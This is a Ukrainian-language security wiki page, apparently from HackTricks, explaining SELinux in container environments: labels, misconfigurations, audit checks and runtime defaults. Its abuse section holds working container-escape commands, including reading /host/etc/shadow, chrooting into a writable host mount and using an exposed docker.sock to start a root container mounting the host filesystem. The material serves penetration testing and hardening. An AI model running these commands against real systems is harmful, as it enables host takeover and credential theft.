# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

SELinux — це система **примусового контролю доступу на основі міток**. Кожен відповідний процес і об'єкт може мати контекст безпеки, а політика визначає, які домени можуть взаємодіяти з якими типами та яким чином. У контейнеризованих середовищах це зазвичай означає, що runtime запускає процес контейнера в обмеженому домені контейнера та позначає вміст контейнера відповідними типами. Якщо політика працює належним чином, процес може читати й записувати об'єкти, до яких, згідно з його міткою, він має отримувати доступ, але йому буде відмовлено в доступі до іншого вмісту хоста, навіть якщо цей вміст стане видимим через mount.

Це один із найпотужніших доступних захистів на стороні хоста в поширених Linux-розгортаннях контейнерів. Він особливо важливий у Fedora, RHEL, CentOS Stream, OpenShift та інших екосистемах, орієнтованих на SELinux. У таких середовищах аудитор, який ігнорує SELinux, часто неправильно розуміє, чому очевидний шлях до компрометації хоста насправді заблокований.

## AppArmor Vs SELinux

Найпростіша відмінність на високому рівні полягає в тому, що AppArmor базується на шляхах, тоді як SELinux є **системою на основі міток**. Це має значні наслідки для безпеки контейнерів. Політика на основі шляхів може поводитися по-різному, якщо той самий вміст хоста стане видимим за неочікуваним шляхом mount. Політика на основі міток натомість перевіряє мітку об'єкта та те, що домен процесу може з ним робити. Це не робить SELinux простим, але забезпечує стійкість до певного класу припущень щодо маніпуляцій зі шляхами, які захисники іноді ненавмисно роблять у системах на основі AppArmor.

Оскільки ця модель орієнтована на мітки, обробка volume контейнера та рішення щодо повторного маркування мають критичне значення для безпеки. Якщо runtime або оператор надто широко змінює мітки, щоб «змусити mount працювати», межа політики, яка мала ізолювати workload, може стати значно слабшою, ніж передбачалося.

## Лабораторна робота

Щоб перевірити, чи активний SELinux на хості:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Щоб перевірити наявні мітки на хості:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Щоб порівняти звичайний запуск із запуском, у якому маркування вимкнено:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
На хості з увімкненим SELinux це дуже практична демонстрація, оскільки вона показує різницю між workload, що працює в очікуваному container domain, і workload, у якого цей enforcement layer було вилучено.

## Використання під час роботи

Podman особливо добре узгоджується з SELinux у системах, де SELinux є частиною стандартної платформи. Rootless Podman разом із SELinux — одна з найнадійніших mainstream-баз для контейнерів, оскільки процес уже є unprivileged на боці хоста й водночас залишається обмеженим політикою MAC. Docker також може використовувати SELinux там, де це підтримується, хоча адміністратори іноді вимикають його, щоб обійти проблеми з volume labeling. CRI-O та OpenShift значною мірою покладаються на SELinux як на частину своєї моделі container isolation. Kubernetes також може надавати налаштування, пов’язані із SELinux, але їхня цінність, очевидно, залежить від того, чи ОС вузла фактично підтримує та застосовує SELinux.

Основний висновок полягає в тому, що SELinux — не optional garnish. В ecosystem, побудованих навколо нього, він є частиною очікуваної security boundary.

## Неправильні конфігурації

Класична помилка — `label=disable`. На практиці це часто відбувається тому, що доступ до volume mount було заборонено, а найшвидшою короткостроковою відповіддю стало усунення SELinux із рівняння замість виправлення моделі labeling. Інша поширена помилка — неправильний relabeling вмісту хоста. Масштабні операції relabel можуть змусити application працювати, але водночас вони можуть значно розширити перелік об’єктів, яких контейнеру дозволено торкатися, далеко за межі початкового задуму.

Також важливо не плутати **встановлений** SELinux із **фактично застосованим** SELinux. Хост може підтримувати SELinux і водночас перебувати в permissive mode, або runtime може запускати workload не в очікуваному domain. У таких випадках захист значно слабший, ніж це може випливати з документації.

## Зловживання

Коли SELinux відсутній, працює в permissive mode або широко вимкнений для workload, змонтовані шляхи хоста стає значно легше використовувати зловмисно. Той самий bind mount, який за інших умов був би обмежений labels, може перетворитися на прямий шлях до даних хоста або до його модифікації. Це особливо важливо в поєднанні з writable volume mounts, директоріями container runtime або operational shortcuts, які задля зручності відкривали доступ до sensitive host paths.

SELinux часто пояснює, чому generic breakout writeup одразу спрацьовує на одному хості, але неодноразово не спрацьовує на іншому, хоча runtime flags виглядають подібно. Відсутнім компонентом часто є не namespace і не capability, а label boundary, яка залишилася неушкодженою.

Найшвидша практична перевірка — порівняти active context, а потім перевірити змонтовані host paths або runtime directories, які зазвичай були б обмежені labels:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Якщо присутнє host bind mount, а маркування SELinux вимкнено або послаблено, розкриття інформації часто відбувається першим:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Якщо mount доступний для запису, а з точки зору kernel container фактично має права host-root, наступним кроком буде тестування контрольованої модифікації host, а не припущення:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
На хостах із підтримкою SELinux втрата міток навколо каталогів стану середовища виконання також може відкрити прямі шляхи до підвищення привілеїв:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ці команди не замінюють повний ланцюжок escape, але дуже швидко показують, чи саме SELinux перешкоджав доступу до даних host або модифікації файлів на стороні host.

### Повний приклад: SELinux вимкнено + доступний для запису mount host

Якщо маркування SELinux вимкнено, а файлова система host змонтована з можливістю запису в `/host`, повний host escape перетворюється на звичайний випадок зловживання bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Якщо `chroot` завершується успішно, процес контейнера тепер працює з файлової системи хоста:
```bash
id
hostname
cat /etc/passwd | tail
```
### Повний приклад: SELinux вимкнено + каталог Runtime

Якщо workload може отримати доступ до runtime socket після вимкнення міток, escape можна делегувати runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Важливим є те, що SELinux часто був механізмом контролю, який запобігав саме такому доступу до шляхів хоста або стану runtime.

## Перевірки

Мета перевірок SELinux — підтвердити, що SELinux увімкнено, визначити поточний security context і перевірити, чи справді файли або шляхи, які вас цікавлять, обмежені за допомогою label.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Що тут важливо:

- `getenforce` в ідеалі має повертати `Enforcing`; `Permissive` або `Disabled` змінює значення всього розділу про SELinux.
- Якщо контекст поточного процесу виглядає неочікуваним або надто широким, workload може працювати не відповідно до призначеної політики контейнера.
- Якщо файли, змонтовані з хоста, або runtime-директорії мають мітки, до яких процес має надто вільний доступ, bind mounts стають набагато небезпечнішими.

Під час перевірки контейнера на платформі з підтримкою SELinux не вважайте маркування другорядною деталлю. У багатьох випадках саме воно є однією з головних причин, чому хост ще не скомпрометований.

## Типові налаштування Runtime

| Runtime / платформа | Типовий стан | Типова поведінка | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | Залежить від хоста | Розділення SELinux доступне на хостах із підтримкою SELinux, але точна поведінка залежить від конфігурації хоста/daemon | `--security-opt label=disable`, широке перемаркування bind mounts, `--privileged` |
| Podman | Зазвичай увімкнено на хостах із SELinux | Розділення SELinux є стандартною частиною Podman у системах із SELinux, якщо його не вимкнено | `--security-opt label=disable`, `label=false` у `containers.conf`, `--privileged` |
| Kubernetes | Зазвичай автоматично не призначається на рівні Pod | Підтримка SELinux існує, але Pods зазвичай потребують `securityContext.seLinuxOptions` або специфічних для платформи налаштувань за замовчуванням; необхідна підтримка з боку runtime і node | слабкі або надто широкі `seLinuxOptions`, запуск на nodes із permissive/disabled, політики платформи, що вимикають маркування |
| CRI-O / розгортання в стилі OpenShift | Зазвичай активно використовується | У таких середовищах SELinux часто є ключовою частиною моделі ізоляції node | кастомні політики, що надмірно розширюють доступ, вимкнення маркування для сумісності |

Налаштування SELinux за замовчуванням більше залежать від дистрибутива, ніж налаштування seccomp. У системах на кшталт Fedora/RHEL/OpenShift SELinux часто є центральною частиною моделі ізоляції. У системах без SELinux він просто відсутній.
